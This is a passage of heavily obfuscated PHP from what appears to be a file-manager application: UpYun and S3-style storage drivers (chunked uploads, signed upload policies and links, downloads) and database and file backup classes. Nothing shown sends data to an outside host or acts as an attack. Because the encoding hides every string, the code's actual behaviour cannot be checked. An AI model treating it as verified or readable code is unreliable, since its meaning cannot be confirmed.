fopen($»›©ØÓÂ, $±›ÚÄèÌ[1487]); if (!$æ„üš¿Ÿ) { return !1; } do { $œº€ƒîÎ = $…ªîñ¤[$±›ÚÄèÌ[1611]]; fseek_64($æ„üš¿Ÿ, $çĞ¸³…â); $´£Ê£®Ù = fread($æ„üš¿Ÿ, $œº€ƒîÎ); $³Ù¦Œ¸ = 0; do { $³Ù¦Œ¸++; $…ªîñ¤ = $this->uploadPart($Êò¬‘ , $…ªîñ¤, $´£Ê£®Ù); } while (!$…ªîñ¤ && $³Ù¦Œ¸ < 3); if (!$…ªîñ¤) { return !1; } $‹ş‰æÎÎ = $…ªîñ¤[$±›ÚÄèÌ[1610]]; $çĞ¸³…â += $œº€ƒîÎ; } while ($‹ş‰æÎÎ != -1); fclose($æ„üš¿Ÿ); $Û Æáì® = array($±›ÚÄèÌ[1612], $±›ÚÄèÌ[1613] . $…ªîñ¤[$±›ÚÄèÌ[1614]], $±›ÚÄèÌ[1608]); $½…õÉÅã = $this->ussRequest($Êò¬‘ , $±›ÚÄèÌ[256], !1, $Û Æáì®); return $½…õÉÅã[$±›ÚÄèÌ[1317]] ? $this->getPathOuter($æŸï€ûŸ) : !1; } private function uploadPart($®õÊèİö, $”í®üÒ®, &$‹Ä±‡î) { $Ñï÷ Ø¥ =& $_SERVER[É¨™èà]; $àû½ûâ = array($Ñï÷ Ø¥[1615], $Ñï÷ Ø¥[1613] . $”í®üÒ®[$Ñï÷ Ø¥[1614]], $Ñï÷ Ø¥[1616] . $”í®üÒ®[$Ñï÷ Ø¥[1610]], $Ñï÷ Ø¥[146] . $”í®üÒ®[$Ñï÷ Ø¥[1611]]); $¥®§ €Â = $this->ussRequest($®õÊèİö, $Ñï÷ Ø¥[256], $‹Ä±‡î, $àû½ûâ); return !$¥®§ €Â[$Ñï÷ Ø¥[1317]] ? $¥®§ €Â[$Ñï÷ Ø¥[1317]] : $¥®§ €Â[$Ñï÷ Ø¥[1307]]; } public function uploadFormData($Ñ®»Òš¤, $“ƒöÃ = 3600) { return $this->uploadPolicy($Ñ®»Òš¤, $“ƒöÃ); } public function uploadMultiData($ˆ…îõÁ­, $˜¹í‚¹Æ = 3600) { $„Ó…³µÅ =& $_SERVER[É¨™èà]; $²Ã£øÖà = (int) $GLOBALS[$„Ó…³µÅ[7]][$„Ó…³µÅ[79]]; return $this->uploadPolicy($ˆ…îõÁ­, $˜¹í‚¹Æ, $²Ã£øÖà); } private function uploadPolicy($©Ñ—¹´ä, $÷›™ûßŞ = 3600, $çùˆÖşÁ = 0) { $ØŸü„íç =& $_SERVER[É¨™èà]; $Á¸•‘ÖÔ = $ØŸü„íç[8] . $this->bucket; $‘„ôğ¯Æ = gmdate($ØŸü„íç[1522]); $¢ˆÛ›Å = array($ØŸü„íç[1617] => $this->bucket, $ØŸü„íç[1618] => $©Ñ—¹´ä, $ØŸü„íç[1619] => time() + $÷›™ûßŞ, $ØŸü„íç[1620] => $‘„ôğ¯Æ); if ($çùˆÖşÁ) { $¢ˆÛ›Å[$ØŸü„íç[1507]] = $çùˆÖşÁ; } $òæá½ú¤ = base64_encode(json_encode($¢ˆÛ›Å)); $Ü±Æßİ– = base64_encode(hash_hmac($ØŸü„íç[1574], "\x50\x4f\x53\x54\x26{$Á¸•‘ÖÔ}\46{$‘„ôğ¯Æ}\46{$òæá½ú¤}", md5("{$this->userpass}"), !0)); $Ê÷ë®ÈÖ = array($ØŸü„íç[280] => $òæá½ú¤, $ØŸü„íç[1621] => "\125\120\131\125\116\x20{$this->username}\72{$Ü±Æßİ–}", $ØŸü„íç[209] => $this->endpoint . $Á¸•‘ÖÔ); return $Ê÷ë®ÈÖ; } public function download($Ö£„çáĞ, $ù¬–¾ƒÚ) { $Ô”Æäö† = IO::getPathInner(IO::mkfile($ù¬–¾ƒÚ)); if (!($»°á = $this->link($Ö£„çáĞ))) { return !1; } $ïò ˜üœ = 0; $èçêÍã’ = 1024 * 200; $“¦Õ°ğù = fopen($Ô”Æäö†, $_SERVER[É¨™èà][1569]); while (!0) { $ëíº‘ı© = $this->fileSubstr($Ö£„çáĞ, $ïò ˜üœ, $èçêÍã’); if ($ëíº‘ı© === !1) { return !1; } fwrite($“¦Õ°ğù, $ëíº‘ı©); $ïò ˜üœ += $èçêÍã’; if (strlen($ëíº‘ı©) < $èçêÍã’) { break; } } fclose($“¦Õ°ğù); return $ù¬–¾ƒÚ; } public function link($¸×¢Æğ½, $×şîç½ß = array()) { $ˆ¯¥şï° =& $_SERVER[É¨™èà]; $¸×¢Æğ½ = trim($¸×¢Æğ½, $ˆ¯¥şï°[8]); if (!empty($this->token)) { $Ïå“¨ĞÌ = strtotime(date($ˆ¯¥şï°[1622])); $ŞäÇ·™ó = substr(md5($this->token . $ˆ¯¥şï°[287] . $Ïå“¨ĞÌ . $ˆ¯¥şï°[1623] . $¸×¢Æğ½), 12, 8) . $Ïå“¨ĞÌ; $×şîç½ß[] = $ˆ¯¥şï°[1624] . $ŞäÇ·™ó; } $–½…®è = !empty($×şîç½ß) ? $ˆ¯¥şï°[76] . implode($ˆ¯¥şï°[287], $×şîç½ß) : $ˆ¯¥şï°[12]; return $this->getHost() . $ˆ¯¥şï°[8] . $this->pathEncode($¸×¢Æğ½) . $–½…®è; } public function fileOut($ô‹ƒÈ¹³, $»Õ‡Ø¶„ = false, $‚â¯õ ’ = false, $“óò¥İŒ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ô‹ƒÈ¹³, $»Õ‡Ø¶„, $‚â¯õ ’, $“óò¥İŒ); } if (!$‚â¯õ ’) { $‚â¯õ ’ = $this->pathThis($ô‹ƒÈ¹³); } $Çå§æ¢ = $»Õ‡Ø¶„ ? array($_SERVER[É¨™èà][1625] . rawurlencode($‚â¯õ ’)) : array(); $û¤„¢Œ€ = $this->link($ô‹ƒÈ¹³, $Çå§æ¢); $this->fileOutLink($û¤„¢Œ€); } public function fileOutServer($Ğí¬Ï, $ı’áøÁé = false, $ü¥œ‡Ñ® = false, $‡ç¿Ñ¤Ï = '') { parent::fileOut($Ğí¬Ï, $ı’áøÁé, $ü¥œ‡Ñ®, $‡ç¿Ñ¤Ï); } public function fileOutImage($ËÆÅ¢Æ», $¶•ÅŠÔø = 250) { $ÀãƒŸã’ = $this->link($ËÆÅ¢Æ» . $_SERVER[É¨™èà][1626] . $¶•ÅŠÔø); $this->fileOutLink($ÀãƒŸã’); } public function fileOutImageServer($éš´¥©§, $íÜ¶Ÿ à = 250) { parent::fileOutImage($éš´¥©§, $íÜ¶Ÿ à); } public function hashMd5($‹Èç—ĞÁ) { $Â÷Šëö„ =& $_SERVER[É¨™èà]; $æÅ¶î’­ = $this->_objectMeta($‹Èç—ĞÁ); return isset($æÅ¶î’­[$Â÷Šëö„[248]]) ? $æÅ¶î’­[$Â÷Šëö„[248]] : !1; } public function size($Ìá‡‡ğÜ) { $ƒò›éŸì = $this->objectMeta($Ìá‡‡ğÜ); return $ƒò›éŸì ? $ƒò›éŸì[$_SERVER[É¨™èà][79]] : 0; } public function info($ÁŒã£¾) { if ($this->isFolder($ÁŒã£¾)) { return $this->folderInfo($ÁŒã£¾); } else { if ($this->isFile($ÁŒã£¾)) { return $this->fileInfo($ÁŒã£¾); } } return !1; } public function exist($ì·ÊÒÃ¢) { return $this->isFile($ì·ÊÒÃ¢) || $this->isFolder($ì·ÊÒÃ¢); } public function isFile($¡ ¬·öä) { return !$this->isFolder($¡ ¬·öä) && $this->objectMeta($¡ ¬·öä); } public function isFolder($ùŸ¾ü•·) { return $this->cacheMethod($_SERVER[É¨™èà][180], $ùŸ¾ü•·); } protected function objectMeta($Í×¶Ÿ²) { return $this->cacheMethod($_SERVER[É¨™èà][182], $Í×¶Ÿ²); } protected function _objectMeta($ÓùöĞ€) { $ï€šİÑá =& $_SERVER[É¨™èà]; if ($ÓùöĞ€ == $ï€šİÑá[12] || $ÓùöĞ€ == $ï€šİÑá[8]) { return array(); } $Ü¸ÒÍ·‰ = $this->ussRequest($ÓùöĞ€, $ï€šİÑá[1627]); if (!$Ü¸ÒÍ·‰[$ï€šİÑá[1317]]) { return null; } $Ù±İÒÕ = isset($Ü¸ÒÍ·‰[$ï€šİÑá[1307]]) ? $Ü¸ÒÍ·‰[$ï€šİÑá[1307]] : array(); if (!isset($Ù±İÒÕ[$ï€šİÑá[1628]])) { return null; } $ˆê´›Ûœ = array($ï€šİÑá[33] => isset($Ù±İÒÕ[$ï€šİÑá[1628]]) ? $Ù±İÒÕ[$ï€šİÑá[1628]] : null, $ï€šİÑá[79] => isset($Ù±İÒÕ[$ï€šİÑá[1629]]) ? $Ù±İÒÕ[$ï€šİÑá[1629]] : null, $ï€šİÑá[248] => isset($Ù±İÒÕ[$ï€šİÑá[1630]]) ? $Ù±İÒÕ[$ï€šİÑá[1630]] : null, $ï€šİÑá[1597] => isset($Ù±İÒÕ[$ï€šİÑá[1631]]) ? $Ù±İÒÕ[$ï€šİÑá[1631]] : null); $ˆê´›Ûœ[$ï€šİÑá[1598]] = isset($Ù±İÒÕ[$ï€šİÑá[1632]]) ? strtotime($Ù±İÒÕ[$ï€šİÑá[1632]]) : $ˆê´›Ûœ[$ï€šİÑá[1597]]; return $ˆê´›Ûœ; } protected function _isFolder($£ä„¹) { $ºĞßØÚ =& $_SERVER[É¨™èà]; if ($£ä„¹ == $ºĞßØÚ[12] || $£ä„¹ == $ºĞßØÚ[8]) { return !0; } $ÇÏüÅÛ­ = $this->_objectMeta($£ä„¹); return isset($ÇÏüÅÛ­[$ºĞßØÚ[33]]) && $ÇÏüÅÛ­[$ºĞßØÚ[33]] == $ºĞßØÚ[78] ? !0 : !1; } } goto dœ¶¨ÑÚ†í; A¾©©œÈ³: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($à¨§ı‚Ï) { $this->pathParse = $à¨§ı‚Ï; } protected function infoParse($ÈĞ·²ÖË, $¦Ö¡Ö¬ø = false) { $‘Ù—‚ëì =& $_SERVER[É¨™èà]; return Action($‘Ù—‚ëì[1276])->sharePathInfo($this->pathParse[$‘Ù—‚ëì[87]], !0, $¦Ö¡Ö¬ø); } public function listPath($Ë…ú•ƒ, $ï±·„…† = false) { $»íá­Æ =& $_SERVER[É¨™èà]; $Ø×‹ñ’¢ = IO::listPath($Ë…ú•ƒ, $ï±·„…†); if (!$Ø×‹ñ’¢) { return $Ø×‹ñ’¢; } if (is_array($Ø×‹ñ’¢[$»íá­Æ[1456]])) { $âáïöâ = Action($»íá­Æ[1466])->parsePathChildren($Ø×‹ñ’¢[$»íá­Æ[1456]], array($»íá­Æ[505] => $Ë…ú•ƒ)); $Ø×‹ñ’¢[$»íá­Æ[1456]] = Action($»íá­Æ[1276])->shareItemInfo($âáïöâ); } foreach ($Ø×‹ñ’¢ as $î«ñ‡«ì => $Æ…³•û) { if (!in_array($î«ñ‡«ì, array($»íá­Æ[86], $»íá­Æ[85]))) { continue; } foreach ($Æ…³•û as $Ç©¿ïÃÇ => $âáïöâ) { $âáïöâ = Action($»íá­Æ[1466])->parsePathChildren($âáïöâ, array($»íá­Æ[505] => $Ë…ú•ƒ)); $Ø×‹ñ’¢[$î«ñ‡«ì][$Ç©¿ïÃÇ] = Action($»íá­Æ[1276])->shareItemInfo($âáïöâ); } } return $Ø×‹ñ’¢; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Çê¿á€¶) { parent::__construct($Çê¿á€¶); $this->setSignVersion($_SERVER[É¨™èà][250]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¹ô“àâ) { parent::__construct($¹ô“àâ); $this->setSignVersion($_SERVER[É¨™èà][250]); } public function uploadFormData($ŸâÀŸ÷Í, $¶›©Û±Ü = 3600) { $®¼Õ‡ù =& $_SERVER[É¨™èà]; $Ò…ø¬í¥ = $®¼Õ‡ù[232]; $×‰Äàğ¸ = $®¼Õ‡ù[260]; $Ï²®Ïİ = $®¼Õ‡ù[62]; $õ±•…–« = gmdate($®¼Õ‡ù[261]); $´Âçò½Œ = gmdate($®¼Õ‡ù[262]); $·üµÓ¾‘ = $®¼Õ‡ù[263]; $ÖÓÕéË = $¶›©Û±Ü . $®¼Õ‡ù[12]; $ÑŸ¼™¡‚ = $®¼Õ‡ù[264]; $ùìƒµŒ = array($this->accessKey, $´Âçò½Œ, $this->region, $Ï²®Ïİ, $·üµÓ¾‘); $ãçö¬´ = implode($®¼Õ‡ù[8], $ùìƒµŒ); $€Œ¸¢ = array($®¼Õ‡ù[265] => gmdate($®¼Õ‡ù[1440], strtotime($®¼Õ‡ù[267])), $®¼Õ‡ù[268] => array(array($®¼Õ‡ù[269] => $this->bucket), array($®¼Õ‡ù[318] => $Ò…ø¬í¥), array($®¼Õ‡ù[270], $®¼Õ‡ù[271], $®¼Õ‡ù[12]), array($®¼Õ‡ù[270], $®¼Õ‡ù[272], $®¼Õ‡ù[12]), array($®¼Õ‡ù[270], $®¼Õ‡ù[319], $®¼Õ‡ù[12]), array($®¼Õ‡ù[273] => $ÑŸ¼™¡‚), array($®¼Õ‡ù[274] => $ãçö¬´), array($®¼Õ‡ù[275] => $×‰Äàğ¸), array($®¼Õ‡ù[276] => $õ±•…–«), array($®¼Õ‡ù[277] => $ÖÓÕéË))); $Ÿ„õÏÚò = base64_encode(json_encode($€Œ¸¢)); $Í¸óÏÅÊ = hash_hmac($®¼Õ‡ù[278], $´Âçò½Œ, $®¼Õ‡ù[279] . $this->secret, !0); $…§®Œ²… = hash_hmac($®¼Õ‡ù[278], $this->region, $Í¸óÏÅÊ, !0); $¢˜×ğÍ = hash_hmac($®¼Õ‡ù[278], $Ï²®Ïİ, $…§®Œ²…, !0); $ËÛ™˜’µ = hash_hmac($®¼Õ‡ù[278], $·üµÓ¾‘, $¢˜×ğÍ, !0); $½Æ¹®ê• = hash_hmac($®¼Õ‡ù[278], $Ÿ„õÏÚò, $ËÛ™˜’µ); $ÔŞ›Ôãõ = array($®¼Õ‡ù[249] => $®¼Õ‡ù[12], $®¼Õ‡ù[297] => $®¼Õ‡ù[12], $®¼Õ‡ù[318] => $Ò…ø¬í¥, $®¼Õ‡ù[273] => $ÑŸ¼™¡‚, $®¼Õ‡ù[280] => $Ÿ„õÏÚò, $®¼Õ‡ù[320] => $ãçö¬´, $®¼Õ‡ù[321] => $×‰Äàğ¸, $®¼Õ‡ù[322] => $õ±•…–«, $®¼Õ‡ù[323] => $ÖÓÕéË, $®¼Õ‡ù[324] => $½Æ¹®ê•, $®¼Õ‡ù[209] => $this->getHost()); return $ÔŞ›Ôãõ; } } goto Aä‚¾ºÀ‘æ; cçÇÂ–ÕêÄ: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[É¨™èà][838]); $this->init(); $this->keep(); } public function init() { $ë˜Şˆ© =& $_SERVER[É¨™èà]; $this->isManual(); self::$name = date($ë˜Şˆ©[839]); if (!($‘è€¼äİ = $this->model->lastItem())) { $‘è€¼äİ = $this->initData(); } else { self::$name = $‘è€¼äİ[$ë˜Şˆ©[32]]; if ($‘è€¼äİ[$ë˜Şˆ©[840]] == $ë˜Şˆ©[91]) { self::$name = date($ë˜Şˆ©[262]); $ŞÚÜ´æ» = intval(_get($‘è€¼äİ, $ë˜Şˆ©[841], 0)); if (self::$manual == 0 && $‘è€¼äİ[$ë˜Şˆ©[32]] == self::$name) { $this->model->remove($‘è€¼äİ[$ë˜Şˆ©[485]]); } $‘è€¼äİ = $this->initData($ŞÚÜ´æ», $‘è€¼äİ[$ë˜Şˆ©[842]]); } else { $this->checkStore($‘è€¼äİ[$ë˜Şˆ©[842]]); } } self::$option = $‘è€¼äİ; } private function isManual() { $Ñ´’ñÛÎ = _get($GLOBALS, $_SERVER[É¨™èà][843], 0); $Ñ´’ñÛÎ = intval($Ñ´’ñÛÎ); self::$manual = $Ñ´’ñÛÎ && $Ñ´’ñÛÎ == 1 ? 1 : 0; } private function initData($ï˜¡ÑíÎ = 0, $²õ‚ä‘é = '') { $×ëÒÖ‘¥ =& $_SERVER[É¨™èà]; $¾ˆœÃ´ = $this->model->config(); if ($²õ‚ä‘é && $¾ˆœÃ´[$×ëÒÖ‘¥[842]] != $²õ‚ä‘é) { $ï˜¡ÑíÎ = 0; } $this->checkStore($¾ˆœÃ´[$×ëÒÖ‘¥[842]]); if (self::$manual == 1) { self::$name .= $×ëÒÖ‘¥[11] . date($×ëÒÖ‘¥[844]); } $¥¤Ğ…÷  = array($×ëÒÖ‘¥[842] => $¾ˆœÃ´[$×ëÒÖ‘¥[842]], $×ëÒÖ‘¥[32] => self::$name, $×ëÒÖ‘¥[840] => 0, $×ëÒÖ‘¥[171] => $¾ˆœÃ´[$×ëÒÖ‘¥[171]], $×ëÒÖ‘¥[845] => self::$manual, $×ëÒÖ‘¥[846] => array($×ëÒÖ‘¥[847] => array($×ëÒÖ‘¥[840] => 0), $×ëÒÖ‘¥[848] => array($×ëÒÖ‘¥[840] => 0, $×ëÒÖ‘¥[849] => 0, $×ëÒÖ‘¥[850] => 0, $×ëÒÖ‘¥[33] => $×ëÒÖ‘¥[12], $×ëÒÖ‘¥[851] => 0, $×ëÒÖ‘¥[852] => 0), $×ëÒÖ‘¥[853] => array($×ëÒÖ‘¥[840] => 0, $×ëÒÖ‘¥[849] => 0, $×ëÒÖ‘¥[850] => 0, $×ëÒÖ‘¥[851] => 0, $×ëÒÖ‘¥[852] => 0), $×ëÒÖ‘¥[233] => array($×ëÒÖ‘¥[840] => 0, $×ëÒÖ‘¥[854] => 0, $×ëÒÖ‘¥[855] => 0, $×ëÒÖ‘¥[856] => 0, $×ëÒÖ‘¥[857] => 0, $×ëÒÖ‘¥[553] => $ï˜¡ÑíÎ, $×ëÒÖ‘¥[851] => 0, $×ëÒÖ‘¥[852] => 0)), $×ëÒÖ‘¥[851] => time(), $×ëÒÖ‘¥[852] => 0); $¦ŞÎÙ® = $this->model->insert($¥¤Ğ…÷ ); $¥¤Ğ…÷ [$×ëÒÖ‘¥[485]] = $¦ŞÎÙ®; return $¥¤Ğ…÷ ; } private function checkStore($ø¨’À±ä) { $ğŞÖ±ô = Model($_SERVER[É¨™èà][858]); $÷‰ä¥ÍÕ = $ğŞÖ±ô->listData($ø¨’À±ä); $ğŞÖ±ô->checkConfig($÷‰ä¥ÍÕ); } public static function get() { if (!self::$option) { $ôÛ×¶µ = Model($_SERVER[É¨™èà][838]); $¨•Ë—Ê¤ = $ôÛ×¶µ->findByName(self::$name); $ôÛ×¶µ->parseContent($¨•Ë—Ê¤); self::$option = $¨•Ë—Ê¤; } return self::$option; } public static function set($‚Åƒ›ÑĞ) { $Êˆ»ä’§ =& $_SERVER[É¨™èà]; $î„†ó¹ = self::get(); foreach ($‚Åƒ›ÑĞ as $™ã¸™Œü => $ñèıú¦) { array_set_value($î„†ó¹, $™ã¸™Œü, $ñèıú¦); } Model($Êˆ»ä’§[838])->update($î„†ó¹[$Êˆ»ä’§[485]], $î„†ó¹); self::$option = $î„†ó¹; return self::$option; } public function keep() { $ƒ¾¶¾áğ =& $_SERVER[É¨™èà]; $š³Ü³¤ = self::get(); if (_get($š³Ü³¤, $ƒ¾¶¾áğ[859], 0) == $ƒ¾¶¾áğ[91]) { return; } $this->backupKeep($š³Ü³¤); self::set(array($ƒ¾¶¾áğ[859] => 1)); } private function backupKeep($§À¼ô¸“) { $õï¸Ù¨† =& $_SERVER[É¨™èà]; if (self::$manual == 1) { return; } $À©»§´Â = $this->model->listData(); if (empty($À©»§´Â)) { return; } $ğö×ÀŞú = 0; $ÎÕ÷ı = array(); foreach ($À©»§´Â as $©·ãò÷) { if ($ğö×ÀŞú >= 7) { break; } $ÎÕ÷ı[] = $©·ãò÷[$õï¸Ù¨†[32]]; $ğö×ÀŞú++; } for ($ğö×ÀŞú = 0; $ğö×ÀŞú < 12; $ğö×ÀŞú++) { $ÎÕ÷ı[] = date($õï¸Ù¨†[860], strtotime("\55{$ğö×ÀŞú}\x20\x6d\157\156\x74\150\x73")); } $ÎÕ÷ı = array_unique($ÎÕ÷ı); $Ø’à§İç = Model($õï¸Ù¨†[861])->get($õï¸Ù¨†[862]); foreach ($À©»§´Â as $©·ãò÷) { if (isset($©·ãò÷[$õï¸Ù¨†[845]]) && $©·ãò÷[$õï¸Ù¨†[845]] == $õï¸Ù¨†[91]) { continue; } if (!empty($©·ãò÷[$õï¸Ù¨†[32]]) && in_array($©·ãò÷[$õï¸Ù¨†[32]], $ÎÕ÷ı)) { continue; } $this->model->remove($©·ãò÷[$õï¸Ù¨†[485]]); $ûÜå’Ğä = $this->backupPath($§À¼ô¸“, $Ø’à§İç); IO::remove($ûÜå’Ğä, !1); } } private function backupPath($Ñ›Üñ™â, $µôì‹ï‘ = false) { $Ã„Â¾©ã =& $_SERVER[É¨™èà]; if (!$µôì‹ï‘) { $µôì‹ï‘ = Model($Ã„Â¾©ã[861])->get($Ã„Â¾©ã[862]); } $«³‡‡–… = $Ñ›Üñ™â[$Ã„Â¾©ã[32]]; $Ùà“±ÈÂ = substr(md5($Ã„Â¾©ã[863] . $µôì‹ï‘ . $«³‡‡–…), 0, 8); return "\173\151\x6f\x3a{$Ñ›Üñ™â[$Ã„Â¾©ã[842]]}\x7d\x2f\x64\x61\164\x61\x62\x61\163\x65\x2f\142\x61\143\x6b\165\x70\57" . $«³‡‡–… . $Ã„Â¾©ã[11] . $Ùà“±ÈÂ; } public function db() { $¹òãÑâ” =& $_SERVER[É¨™èà]; $˜ÕïÀŒ = self::get(); if (_get($˜ÕïÀŒ, $¹òãÑâ”[864], 0) == $¹òãÑâ”[91]) { return !0; } $îª¶»ƒŸ = new BackupDb(); if (!$îª¶»ƒŸ->index()) { return !1; } self::set(array($¹òãÑâ”[864] => 1)); return !0; } public function dbFile() { $¦ï’å› =& $_SERVER[É¨™èà]; $¾Éğ–ÓŠ = self::get(); if (_get($¾Éğ–ÓŠ, $¦ï’å›[865], 0) == $¦ï’å›[91]) { return !0; } $ØÌ = new BackupDbFile(); if (!$ØÌ->index()) { return !1; } self::set(array($¦ï’å›[865] => 1)); return !0; } public function file() { $ºÖÚÚåÓ =& $_SERVER[É¨™èà]; $Ü˜áƒ§ = self::get(); if (_get($Ü˜áƒ§, $ºÖÚÚåÓ[866], 0) == $ºÖÚÚåÓ[91]) { return !0; } if ($Ü˜áƒ§[$ºÖÚÚåÓ[171]] == $ºÖÚÚåÓ[867]) { $‹­‚°¢è = new BackupFile(); if (!$‹­‚°¢è->index()) { return !1; } } self::set(array($ºÖÚÚåÓ[866] => 1, $ºÖÚÚåÓ[840] => 1)); return !0; } public static function log($‰İê¯±) { write_log($‰İê¯±, $_SERVER[É¨™èà][868]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $’öö‘ò =& $_SERVER[É¨™èà]; $«§¯ÔØï = Backup::get(); self::$io = $«§¯ÔØï[$’öö‘ò[842]]; self::$name = $«§¯ÔØï[$’öö‘ò[32]]; $”úéø«æ = new DbManage(); $î¹”²ÒŠ = $”úéø«æ->dbType(); $ƒ»¼Œà = array($’öö‘ò[869] => $î¹”²ÒŠ, $’öö‘ò[870] => time()); Backup::set($ƒ»¼Œà); $ÁóùÏö… = $this->tmpFilesPath() . $’öö‘ò[871] . self::$name . $’öö‘ò[8]; del_dir($ÁóùÏö…); mk_dir($ÁóùÏö…); $ ½‚û¿ = $¦É½ŒêŒ = 0; try { $õ•ªÙû = $”úéø«æ->db()->getTables(); } catch (Exception $´¨°‡¿”) { Backup::log($’öö‘ò[872] . $´¨°‡¿”->getMessage()); return !1; } $õ•ªÙû = array_diff($õ•ªÙû, array($’öö‘ò[873], $’öö‘ò[874])); foreach ($õ•ªÙû as $ƒ½ÅÕü) { if ($ƒ½ÅÕü == $’öö‘ò[875]) { continue; } $ ½‚û¿ += $”úéø«æ->model($ƒ½ÅÕü)->count(); } $¹´›™Ä• = new Task($’öö‘ò[876], $’öö‘ò[868], $ ½‚û¿, LNG($’öö‘ò[877]) . $’öö‘ò[878] . LNG($’öö‘ò[879])); $GLOBALS[$’öö‘ò[880]] = self::$name; foreach ($õ•ªÙû as $ƒ½ÅÕü) { $ì‚ä¿ï£ = $ÁóùÏö… . $ƒ½ÅÕü . $’öö‘ò[881]; if ($ƒ½ÅÕü == $’öö‘ò[875]) { @touch($ì‚ä¿ï£); continue; } $­¤ŒÖå­ = null; if ($ƒ½ÅÕü == $’öö‘ò[882] && $«§¯ÔØï[$’öö‘ò[171]] == $’öö‘ò[867]) { $­¤ŒÖå­ = self::$io; } $¦É½ŒêŒ += $”úéø«æ->sqlFromDb($ƒ½ÅÕü, $ì‚ä¿ï£, $¹´›™Ä•, $­¤ŒÖå­); } unset($GLOBALS[$’öö‘ò[880]]); $¹´›™Ä•->end(); if ($¦É½ŒêŒ > $ ½‚û¿) { $ ½‚û¿ = $¦É½ŒêŒ; } $ƒ»¼Œà = array($’öö‘ò[869] => $î¹”²ÒŠ, $’öö‘ò[864] => 1, $’öö‘ò[883] => $ ½‚û¿, $’öö‘ò[884] => $¦É½ŒêŒ, $’öö‘ò[885] => time()); Backup::set($ƒ»¼Œà); if ($ ½‚û¿ - $¦É½ŒêŒ > 0) { $ÁÅ†Â¬ = $’öö‘ò[886]; if (!stristr(I18n::getType(), $’öö‘ò[887])) { $ÁÅ†Â¬ = $’öö‘ò[888]; } Backup::log(array($ÁÅ†Â¬, $ƒ»¼Œà)); return !1; } return !0; } private function tmpFilesPath() { $Œ•Ìƒüî =& $_SERVER[É¨™èà]; $ÅËÛÚêÏ = TEMP_FILES; if ($GLOBALS[$Œ•Ìƒüî[6]][$Œ•Ìƒüî[92]][$Œ•Ìƒüî[889]]) { $ÅËÛÚêÏ = $GLOBALS[$Œ•Ìƒüî[6]][$Œ•Ìƒüî[92]][$Œ•Ìƒüî[889]]; if (!mk_dir($ÅËÛÚêÏ) || !is_writable($ÅËÛÚêÏ) || !IO::mkfile($ÅËÛÚêÏ . $Œ•Ìƒüî[890])) { $ÅËÛÚêÏ = TEMP_FILES; } } return $ÅËÛÚêÏ; } } class BackupDbFile { public function __construct() { } public function index() { $®½îİ¿ =& $_SERVER[É¨™èà]; $ƒã·ƒŒœ = Backup::get(); $¶ƒ±à— = $ƒã·ƒŒœ[$®½îİ¿[32]]; $ÄœÚÄ³Ğ = $this->tmpFilesPath() . "\x62\x61\x63\153\165\x70\137{$¶ƒ±à—}\x2f"; $„èÚ‹Åß = $this->backupPath($ƒã·ƒŒœ); if (!($„èÚ‹Åß = IO::mkdir($„èÚ‹Åß))) { Backup::log($®½îİ¿[891] . $„èÚ‹Åß); return !1; } $ª²û²ƒÆ = IO::listPath($ÄœÚÄ³Ğ); $œÖºò—Ã = isset($ª²û²ƒÆ[$®½îİ¿[86]]) ? $ª²û²ƒÆ[$®½îİ¿[86]] : array(); $€Û°ùÅ = array_sum(array_column($œÖºò—Ã, $®½îİ¿[79])); if (!$€Û°ùÅ) { Backup::log($®½îİ¿[892] . $ÄœÚÄ³Ğ); return !1; } $…×ÁÌê = array($®½îİ¿[893] => $€Û°ùÅ, $®½îİ¿[894] => time()); Backup::set($…×ÁÌê); $Õ­šçûÕ = new TaskFileTransfer($®½îİ¿[895], $®½îİ¿[868], count($œÖºò—Ã), LNG($®½îİ¿[877]) . $®½îİ¿[472] . LNG($®½îİ¿[879]) . $®½îİ¿[896]); $Õ­šçûÕ->task[$®½îİ¿[854]] = $€Û°ùÅ; foreach ($ª²û²ƒÆ[$®½îİ¿[86]] as $’úó¬Õ) { $™–€¤´º = IO::move($’úó¬Õ[$®½îİ¿[87]], $„èÚ‹Åß); if (!$™–€¤´º) { $Õ­šçûÕ->end(); $Ï‚àí„ = IO::getLastError($®½îİ¿[897] . $’úó¬Õ[$®½îİ¿[87]] . $®½îİ¿[898] . $„èÚ‹Åß . $®½îİ¿[178]); Backup::log($Ï‚àí„); return !1; } } $¥è®øƒç = new DbManage(); $Ï‰ÈÉ€ğ = $¥è®øƒç->getSqlFile(); if (!$Ï‰ÈÉ€ğ || !$Ï‰ÈÉ€ğ[$®½îİ¿[899]] || !$Ï‰ÈÉ€ğ[$®½îİ¿[13]]) { Backup::log($®½îİ¿[900]); return !1; } IO::move($Ï‰ÈÉ€ğ[$®½îİ¿[899]], $„èÚ‹Åß); IO::move($Ï‰ÈÉ€ğ[$®½îİ¿[13]], $„èÚ‹Åß); $Õ­šçûÕ->end(); $…×ÁÌê = array($®½îİ¿[901] => $€Û°ùÅ, $®½îİ¿[902] => time()); Backup::set($…×ÁÌê); return !0; } private function backupPath($¨õ°êáä) { $³Ñ€¨—ù =& $_SERVER[É¨™èà]; $ïâ¡Üß¨ = $¨õ°êáä[$³Ñ€¨—ù[32]]; $ù‡›Æ = Model($³Ñ€¨—ù[861])->get($³Ñ€¨—ù[862]); $Ô‚óœ® = substr(md5($³Ñ€¨—ù[863] . $ù‡›Æ . $ïâ¡Üß¨), 0, 8); return "\173\x69\157\x3a{$¨õ°êáä[$³Ñ€¨—ù[842]]}\175\57\144\x61\164\141\142\141\x73\145\57\x62\141\143\x6b\165\x70\x2f" . $ïâ¡Üß¨ . $³Ñ€¨—ù[11] . $Ô‚óœ®; } private function tmpFilesPath() { $¶ğ¨½ÃÎ =& $_SERVER[É¨™èà]; $‘‡šóõ = TEMP_FILES; if ($GLOBALS[$¶ğ¨½ÃÎ[6]][$¶ğ¨½ÃÎ[92]][$¶ğ¨½ÃÎ[889]]) { $‘‡šóõ = $GLOBALS[$¶ğ¨½ÃÎ[6]][$¶ğ¨½ÃÎ[92]][$¶ğ¨½ÃÎ[889]]; if (!mk_dir($‘‡šóõ) || !is_writable($‘‡šóõ) || !IO::mkfile($‘‡šóõ . $¶ğ¨½ÃÎ[890])) { $‘‡šóõ = 